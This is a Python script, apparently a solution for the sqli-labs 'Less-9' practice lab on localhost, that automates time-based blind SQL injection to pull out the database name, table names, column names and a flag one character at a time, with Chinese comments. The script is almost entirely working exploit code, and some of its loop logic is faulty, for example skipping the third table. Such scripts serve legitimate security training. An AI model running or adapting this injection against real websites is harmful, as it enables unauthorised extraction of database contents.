import requests
import time
import datetime

url = "http://localhost/sqli-labs/Less-9/?id=1'"

def get_dbname():
    dbname = ''
    for i in range(1,9):
        for k in range(32,127):
            payload = "and if(ascii(substr(database(),{0},1))={1},sleep(2),1)--+".format(i,k)
            # payload = " and if(ascii(substr(database(),{0},1))={1},sleep(2),1) --+".format(i,k)
            #if语句里面的sleep(2)为如果注入语句正确就睡眠两秒
            time1 = datetime.datetime.now()
            #获得提交payload之前的时间
            res = requests.get(url + payload)
            time2 = datetime.datetime.now()
            #获得payload提交后的时间
            difference = (time2 - time1).seconds
            #time，time2时间差，seconds是只查看秒
            if difference > 1:
                dbname += chr(k)
            else:
                continue
        print("数据库名为->"+dbname)
get_dbname()

def get_table():
    table1 = ''
    table2 = ''
    table3 = ''
    table4 = ''
    for i in range(5):
        for j in range(6):
            for k in range(32,127):
                payload = "and if(ascii(substr((select table_name from information_schema.tables where table_schema=\'security\' limit %d,1),%d,1))=%d,sleep(2),1)--+"%(i,j,k)
                time1 = datetime.datetime.now()
                res = requests.get(url + payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        table1 += chr(k)
                        print("第一个表为->"+table1)
                    elif i == 1:
                        table2 += chr(k)
                        print("第二个表为->"+table2)
                    elif i == 3:
                        table3 += chr(k)
                        print("第三个表为->"+table3)
                    elif i == 4:
                        table4 += chr(k)
                        print("第四个表为->"+table4)
                    else:
                        break
get_table()

def get_column():
    column1 = ''
    column2 = ''
    column3 = ''
    for i in range(3):
        for j in range(1,9):
            for k in range(32,127):
                payload = "and if(ascii(substr((select column_name from information_schema.columns where table_name=\'flag\' limit %d,1),%d,1))=%d,sleep(2),1)--+"%(i,j,k)
                time1 = datetime.datetime.now()
                res = requests.get(url+payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        column1 += chr(k)
                        print("字段一为->"+column1)
                    if i == 1:
                        column2 += chr(k)
                        print("字段二为->"+column2)
                    if i == 2:
                        column3 += chr(k)
                        print("字段三为->"+column3)
                    else:
                        break
get_column()

def get_flag():
    flag = ''
    for i in range(30):
        for k in range(32,127):
            payload = "and if(ascii(substr((select flag from flag),%d,1))=%d,sleep(2),1)--+"%(i,k)
            time1 = datetime.datetime.now()
            res = requests.get(url+payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference > 1:
                flag += chr(k)
                print("flag为->"+flag)
get_flag()